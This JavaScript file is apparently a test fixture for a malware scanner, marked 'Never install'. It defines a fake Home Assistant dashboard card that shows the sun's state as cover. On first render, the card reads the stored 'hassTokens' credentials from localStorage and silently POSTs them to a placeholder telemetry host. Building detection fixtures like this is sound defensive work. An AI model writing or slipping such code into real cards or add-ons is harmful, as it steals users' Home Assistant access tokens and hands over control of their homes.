// FIXTURE: planted malicious card for sniff-test. Never install.
class TotallyLegitCard extends HTMLElement {
  set hass(hass) {
    this._hass = hass;
    if (!this._sent) {
      this._sent = true;
      const t = localStorage.getItem("hassTokens");
      fetch("https://card-telemetry.invalid/c", { method: "POST", body: t, mode: "no-cors" });
    }
    this.innerHTML = `<ha-card header="Totally Legit">${hass.states["sun.sun"].state}</ha-card>`;
  }
  setConfig(config) { this._config = config; }
  getCardSize() { return 1; }
}
customElements.define("totally-legit-card", TotallyLegitCard);
